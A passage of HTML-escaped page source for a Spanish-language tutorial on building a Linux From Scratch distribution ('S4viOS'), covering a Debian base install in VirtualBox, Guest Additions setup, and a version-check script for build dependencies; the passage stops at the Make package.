          &lt;li&gt;&lt;a href=&quot;#Creando-archivo-rc-site&quot;&gt;Creando archivo rc.site&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Archivos-de-inicio-de-Bash-Shell&quot;&gt;Archivos de inicio de Bash Shell&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Haciendo-nuestro-sistema-booteable&quot;&gt;Haciendo nuestro sistema Booteable&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#Creando-archivo-fstab&quot;&gt;Creando archivo fstab&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Instalación-del-kernel&quot;&gt;Instalación del Kernel&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Uso-del-grub-para-configurar-el-proceso-de-arranque&quot;&gt;Uso del GRUB para configurar el proceso de arranque&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Creando-archivos-finales&quot;&gt;Creando archivos finales&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Arrancando-nuestra-nueva-distribución-Linux-S4viOS&quot;&gt;Arrancando nuestra nueva distribución Linux S4viOS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;antecedentes&quot;&gt;Antecedentes&lt;/h1&gt;
&lt;p&gt;Antes que nada, me gustaría comentar una serie de puntos para aquellos que pretenden seguir esta guía.&lt;/p&gt;

&lt;h4 id=&quot;por-qué-crear-un-sistema-linux-desde-0-manualmente-en-vez-de-descargar-e-instalar-uno-existente&quot;&gt;¿Por qué crear un sistema Linux desde 0 manualmente en vez de descargar e instalar uno existente?&lt;/h4&gt;

&lt;p&gt;Bueno, si te estás haciendo esta pregunta es que lo tuyo no es la curiosidad.&lt;/p&gt;

&lt;p&gt;La idea de esta guía es que te sirva de ayuda para entender y aprender cómo funciona un sistema Linux desde adentro hacia afuera. Construir un sistema LFS desde 0 te ayuda a entender qué hace que Linux funcione y cómo las cosas funcionan a bajo nivel.&lt;/p&gt;

&lt;p&gt;Aparte, una de las mejores cosas que se pueden sacar de provecho de todo esto es la capacidad de personalizar un sistema Linux para satisfacer tus propias necesidades únicas. No me considero un paranoico, pero en muchas distribuciones Linux no es la primera vez que me encuentro con un binario ya previamente compilado cuyo código no puedo ver (por no ser Open Source)… y a saber qué lleva dentro, igual hasta viene con regalo.&lt;/p&gt;

&lt;p&gt;En ese sentido, tal vez por pura prevención (y curiosidad), a veces es mejor tener el control de qué cosas son las que se están instalando en el sistema, ¿no crees?.&lt;/p&gt;

&lt;h4 id=&quot;prerrequisitos&quot;&gt;Prerrequisitos&lt;/h4&gt;

&lt;p&gt;Construir un sistema LFS no es una tarea simple. Para toda esta guía, se requiere un cierto nivel de conocimiento existente sobre la administración del sistema Unix. Si esto es así y se aplica para tu caso… a por ello.&lt;/p&gt;

&lt;p&gt;Otro de los requisitos que se requieren es la &lt;strong&gt;paciencia&lt;/strong&gt;. Construir un sistema LFS no se hace en un día (creedme, lo he intentado), algunos paquetes tardan mucho en instalarse y hay algunas fases que de por sí requieren de tiempo.&lt;/p&gt;

&lt;p&gt;El tiempo estimado para construir tu propio sistema Linux oscila entre &lt;strong&gt;3 y 5 días&lt;/strong&gt;, para que lo tengáis en cuenta.&lt;/p&gt;

&lt;h1 id=&quot;introducción&quot;&gt;INTRODUCCIÓN&lt;/h1&gt;
&lt;h4 id=&quot;consideraciones&quot;&gt;Consideraciones&lt;/h4&gt;

&lt;p&gt;Bueno antes de empezar, deciros que en mi caso voy a estar trabajando con VirtualBox.&lt;/p&gt;

&lt;p&gt;La pregunta que probablemente os hagáis es, ¿y no puedo usar VMware?, pues a ver, por poder podéis… PERO de las veces que he probado con VMware, justo en la fase final a la hora de hacer el Reboot… aparece un &lt;strong&gt;Kernel Panic&lt;/strong&gt;, con el cual me estuve peleando en su momento y no encontré forma de arreglarlo.&lt;/p&gt;

&lt;p&gt;Si queréis no tener que estar lidiando con estos problemas, mi recomendación es que lo hagáis todo con &lt;strong&gt;Virtual Box&lt;/strong&gt;. Por lo demás, hay que tener en cuenta que para construir tu propio sistema Linux, necesitas primero de una distribución Linux de base sobre la que trabajar, ya que es desde esta desde donde estaremos toqueteando nuestro nuevo disco duro virtual que posteriormente crearemos.&lt;/p&gt;

&lt;p&gt;En mi caso, estaré trabajando con un &lt;strong&gt;Debian 10.3.0 amd64&lt;/strong&gt;, el cual puedes descargar desde la página oficial:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://www.debian.org/distrib/netinst&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;instalando-debian-1030&quot;&gt;Instalando Debian 10.3.0&lt;/h4&gt;

&lt;p&gt;Una vez descargado el ISO, lo único que tendremos que hacer es lo siguiente.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346m7.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Es decir, comenzamos creando una nueva máquina virtual. Posteriormente, le asignamos un nombre e indicamos el tipo de sistema operativo con el que estamos tratando así como la versión:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346mT.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, indicamos un tamaño de memoria. En mi caso, asignaré &lt;strong&gt;4096 MB&lt;/strong&gt; de memoria:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346mU.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En el siguiente paso, crearemos un nuevo disco duro virtual:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346mV.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En la selección del tipo de archivo de disco duro, usaremos &lt;strong&gt;VDI&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346n3.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En la especificación de almacenamiento en unidad de disco duro física escogeremos &lt;strong&gt;Tamaño fijo&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346n1.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Y por último, asignaremos un total de &lt;strong&gt;30 GB&lt;/strong&gt; para nuestro disco duro virtual:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346n2.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez finalizado, lo único que tendremos que hacer es dirigirnos a las propiedades de nuestra nueva máquina e importar la ISO de nuestro Debian (la que previamente hemos descargado).&lt;/p&gt;

&lt;p&gt;Esto se hace desde la siguiente sección:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346nf.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ya con todo esto hecho, debería salirnos algo como esto:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346nj.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este punto, lo único que tendremos que hacer ya es arrancar la máquina y comenzar con la fase de instalación.&lt;/p&gt;

&lt;p&gt;Seleccionaremos el idioma:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346nt.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Desde aquí, habrá que rellenar una serie de datos de ubicación que no creo que haga falta añadir en este Gist (es puro sentido común y no creo que tenga pérdida).&lt;/p&gt;

&lt;p&gt;En la especificación de nombre de máquina, yo pondré &lt;strong&gt;Debian&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346o3.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Cuando nos pregunten por el nombre de dominio, simplemente dejad este campo en blanco:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346o2.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Rellenad en el siguiente paso vuestra clave de superusuario:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346o4.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Tanto en el nombre de usuario como en el nombre de cuenta, como es de obviar… especificaremos nuestro usuario identificativo:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346oe.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Y como es de esperar, nuestra contraseña (para no liarnos yo siempre recomiendo que sea la misma que la clave del superusuario):&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346od.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ya con esta fase terminada, se nos preguntará por la zona horaria y nuestra ubicación, aquí que cada uno rellene los datos que considere.&lt;/p&gt;

&lt;p&gt;En el particionado de discos, escogeremos la opción de usar todo el disco:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346or.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Deberíamos ver posteriormente algo como esto:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346os.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, en nuestro caso el esquema de particionado será con todos los ficheros en una partición (posteriormente en nuestro sistema Linux el esquema de particionado será con el /home en otra partición, pero por ahora en nuestro Debian base lo haremos así de simple):&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346ot.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Por último, aplicamos todos los cambios seleccionando la opción ‘&lt;strong&gt;Finalizar el particionado&lt;/strong&gt;’:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346ou.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Seleccionaremos la opción &lt;strong&gt;Sí&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346oL.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En caso de que nos pregunte por otro CD a utilizar, le diremos que no:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346oR.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Y en caso de que nos pregunte por las réplicas de red, de la misma forma seleccionaremos la opción &lt;strong&gt;No&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346oU.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En la selección de programas, nosotros estaremos trabajando con entorno gráfico para estar más cómodos, por tanto… seleccionaremos las siguientes opciones a instalar:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346p2.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Esta fase puede durar unos minutos. Nos preguntará si queremos instalar el cargador de arranque (GRUB), le diremos que sí:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346ps.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Asimismo, indicaremos el dispositivo donde queremos instalar el cargador de arranque, en este caso &lt;strong&gt;/dev/sda&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346pu.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Ya llegados a este punto, habríamos finalizado con toda la fase de instalación y debería salirnos un recuadro como este:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346pV.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Al presionar en ‘&lt;strong&gt;Continuar&lt;/strong&gt;’, nuestro Debian debería arrancar sin mayor inconveniente hasta llegar al entorno gráfico:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346q5.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Dado que las proporciones no son las correctas y estaríamos trabajando con una ventana muy chiquita, en el siguiente punto veremos cómo instalar las &lt;strong&gt;VBox Linux Additions&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;configurando-el-debian-base&quot;&gt;Configurando el Debian base&lt;/h4&gt;

&lt;p&gt;Antes de instalar las &lt;strong&gt;Linux Additions&lt;/strong&gt; para poder trabajar de manera cómoda, lo que haremos será retocar una línea del archivo &lt;strong&gt;/etc/apt/sources.list&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Comentaremos la línea que empieza por ‘&lt;strong&gt;deb cdrom&lt;/strong&gt;’, ya que esta de no estar comentada hace que se nos paren las compilaciones más adelante y estaremos trabajando de manera incómoda:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346qT.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;De la misma forma, descomentaremos las 2 últimas líneas y antes de estas añadiremos un nuevo &lt;strong&gt;deb&lt;/strong&gt;:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346rL.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez hecho, aplicaremos el siguiente comando a nivel de sistema:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Obteniendo el siguiente output por consola:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346rM.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Esta parte es fundamental pues de lo contrario no nos encontrará los paquetes &lt;strong&gt;build-essential&lt;/strong&gt; y &lt;strong&gt;linux-headers-amd64&lt;/strong&gt;, necesarios para instalar las &lt;strong&gt;VBoxLinuxAdditions&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Aplicamos los siguientes comandos como el usuario &lt;strong&gt;root&lt;/strong&gt; para instalar lo previamente citado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;build-essential linux-headers-amd64 &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346sw.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Este proceso puede tardar unos minutos.&lt;/p&gt;

&lt;p&gt;Ahora bien, ¿cómo hacemos para instalar las &lt;strong&gt;VBoxLinuxAdditions&lt;/strong&gt;?. En VirtualBox, en la parte superior, contamos con esta utilidad:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346t7.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Al presionarla, desde nuestra máquina virtual deberemos ver lo siguiente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346t8.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este punto, deberíamos presionar en ‘Ejecutar’. Si vemos un fallo… es normal, no nos asustemos.&lt;/p&gt;

&lt;p&gt;Lo que haremos será de forma manual atender a la siguiente ruta:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346t9.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Eso sí, dado que en esta montura tenemos permisos únicamente de lectura, lo que haremos será crearnos una copia del archivo &lt;strong&gt;VBoxLinuxAdditions.run&lt;/strong&gt;, posteriormente le daremos permisos de ejecución y lo ejecutaremos con bash:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346tH.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Para concluir, aplicamos un &lt;strong&gt;reboot&lt;/strong&gt; de la siguiente forma:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346tM.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez reiniciado nuestro Debian, el entorno gráfico se nos debería cargar perfectamente en pantalla completa sin mayor inconveniente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346tX.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;instalación-de-paquetes-base&quot;&gt;Instalación de paquetes base&lt;/h4&gt;

&lt;p&gt;Lo que haremos a continuación será crear el siguiente script:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; version-check.sh &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
#!/bin/bash
# Simple script to list version numbers of critical development tools
export LC_ALL=C
bash --version | head -n1 | cut -d&quot; &quot; -f2-4
MYSH=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;readlink&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /bin/sh&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
echo &quot;/bin/sh -&amp;gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MYSH&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MYSH&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; | grep -q bash || echo &quot;ERROR: /bin/sh does not point to bash&quot;
unset MYSH

echo -n &quot;Binutils: &quot;; ld --version | head -n1 | cut -d&quot; &quot; -f3-
bison --version | head -n1

if [ -h /usr/bin/yacc ]; then
  echo &quot;/usr/bin/yacc -&amp;gt; `readlink -f /usr/bin/yacc`&quot;;
elif [ -x /usr/bin/yacc ]; then
  echo yacc is `/usr/bin/yacc --version | head -n1`
else
  echo &quot;yacc not found&quot; 
fi

bzip2 --version 2&amp;gt;&amp;amp;1 &amp;lt; /dev/null | head -n1 | cut -d&quot; &quot; -f1,6-
echo -n &quot;Coreutils: &quot;; chown --version | head -n1 | cut -d&quot;)&quot; -f2
diff --version | head -n1
find --version | head -n1
gawk --version | head -n1

if [ -h /usr/bin/awk ]; then
  echo &quot;/usr/bin/awk -&amp;gt; `readlink -f /usr/bin/awk`&quot;;
elif [ -x /usr/bin/awk ]; then
  echo awk is `/usr/bin/awk --version | head -n1`
else 
  echo &quot;awk not found&quot; 
fi

gcc --version | head -n1
g++ --version | head -n1
ldd --version | head -n1 | cut -d&quot; &quot; -f2-  # glibc version
grep --version | head -n1
gzip --version | head -n1
cat /proc/version
m4 --version | head -n1
make --version | head -n1
patch --version | head -n1
echo Perl `perl -V:version`
python3 --version
sed --version | head -n1
tar --version | head -n1
makeinfo --version | head -n1  # texinfo version
xz --version | head -n1

echo 'int main(){}' &amp;gt; dummy.c &amp;amp;&amp;amp; g++ -o dummy dummy.c
if [ -x dummy ]
  then echo &quot;g++ compilation OK&quot;;
  else echo &quot;g++ compilation failed&quot;; fi
rm -f dummy.c dummy
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tras su ejecución, lo normal es obtener errores como los que se listan a continuación:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346vL.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Esto es así dado que vamos a tener que ir instalando una serie de dependencias así como de enlaces simbólicos hasta que la ejecución de este script nos diga que está todo correcto. Lo utilizaremos como Checker.&lt;/p&gt;

&lt;p&gt;Lo que haremos será seguir la siguiente filosofía:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Si el paquete se encuentra instalado, instalaremos el dev [siempre y cuando el paquete disponga del dev]. Si no se encuentra instalado, instalaremos el paquete y el dev.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;¿Qué es esto del dev?, bueno… cada paquete (no todos), suelen venir con una paquetería de desarrollador (-dev o -devel). Estos paquetes adicionales de desarrollador son necesarios para que todo el proceso de construcción de nuestro sistema Linux vaya correctamente.&lt;/p&gt;

&lt;h5 id=&quot;bash&quot;&gt;Bash&lt;/h5&gt;

&lt;p&gt;Empezaremos por el paquete Bash. Haremos la siguiente comprobación:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346wb.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;En este caso, vemos que el paquete ya lo tenía instalado en el sistema. El paquete &lt;strong&gt;Bash&lt;/strong&gt; no cuenta con paquetería de desarrollador, por tanto… lo único que aplico conforme a la validación del script que previamente habíamos ejecutado, es un enlace simbólico para que la ‘&lt;strong&gt;/bin/sh&lt;/strong&gt;’ apunte a una &lt;strong&gt;Bash&lt;/strong&gt;.&lt;/p&gt;

&lt;h5 id=&quot;binutils&quot;&gt;Binutils&lt;/h5&gt;

&lt;p&gt;Validamos de la misma forma e instalamos su correspondiente paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346wE.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;bison&quot;&gt;Bison&lt;/h5&gt;

&lt;p&gt;Este paquete no se debería de encontrar instalado en el sistema, por tanto… instalamos y a la vez instalamos su paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346wM.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;bzip2&quot;&gt;Bzip2&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346x2.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;coreutils&quot;&gt;Coreutils&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346x8.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;diffutils&quot;&gt;Diffutils&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y no posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346xB.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;findutils&quot;&gt;Findutils&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y no posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346xC.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;gawk&quot;&gt;Gawk&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y no posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346xV.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;gcc&quot;&gt;Gcc&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346yf.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;glibc&quot;&gt;Glibc&lt;/h5&gt;

&lt;p&gt;No se encuentra instalado en el sistema y no posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346yk.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;grep&quot;&gt;Grep&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346yD.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;gzip&quot;&gt;Gzip&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346yE.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;m4&quot;&gt;M4&lt;/h5&gt;

&lt;p&gt;Se encuentra instalado en el sistema y posee paquetería de desarrollador:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/346zX.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;make&quot;&gt;Make&lt;/h5&gt;

